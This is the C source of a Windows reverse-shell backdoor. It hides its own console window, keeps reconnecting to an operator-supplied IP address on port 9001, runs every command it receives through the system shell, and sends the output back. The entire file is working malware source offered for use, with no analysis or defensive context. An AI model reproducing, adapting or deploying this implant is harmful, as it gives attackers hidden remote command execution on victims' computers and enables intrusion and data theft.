#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <string.h>

// Define bzero if it's not available on the system
#define bzero(p, size) (void) memset((p), 0, (size))

int sock;
char ip[] = "your ip(example: 192.168.0.1)";

// Function to handle the command shell execution
void Shell() {
    char buffer[1024]; // Buffer to store received commands
    char container[1024]; // Buffer to store command output temporarily
    char total_response[18384]; // Buffer to store complete command output

    while (1) {
        // Clear the buffers
        bzero(buffer, sizeof(buffer));
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));

        // Receive command from the server
        int recv_len = recv(sock, buffer, sizeof(buffer), 0);
        if (recv_len <= 0) {
            perror("recv failed");
            closesocket(sock);
            WSACleanup();
            exit(1);
        }

        // Check for exit command
        if (strncmp("q", buffer, 1) == 0) {
            closesocket(sock);
            WSACleanup();
            exit(0);
        } else {
            FILE *fp;
            // Execute the received command
            fp = _popen(buffer, "r");
            if (fp == NULL) {
                perror("popen failed");
                continue;
            }
            // Read the output of the command
            while (fgets(container, sizeof(container), fp) != NULL) {
                strcat(total_response, container);
            }
            // Send the command output back to the server
            int send_len = send(sock, total_response, sizeof(total_response), 0);
            if (send_len <= 0) {
                perror("send failed");
                fclose(fp);
                closesocket(sock);
                WSACleanup();
                exit(1);
            }
            // Close the command output file
            fclose(fp);
        }
    }
}

// Entry point of the program
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    HWND stealth;

    // Allocate console for the program (useful for debugging)
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);

    // Hide the console window
    ShowWindow(stealth, 0);

    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsaData;

    // Set server IP and port
    ServIP = ip;
    ServPort = 9001;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
        perror("WSAStartup failed");
        exit(1);
    }

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        perror("socket creation failed");
        WSACleanup();
        exit(1);
    }

    // Zero out the server address structure
    memset(&ServAddr, 0, sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
    ServAddr.sin_port = htons(ServPort);

    // Attempt to connect to the server
    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
        perror("connect failed");
        Sleep(1000);  // Sleep for a while before retrying
    }

    printf("Connected\n");
    // Start the shell function to receive and execute commands
    Shell();
    return 0;
}
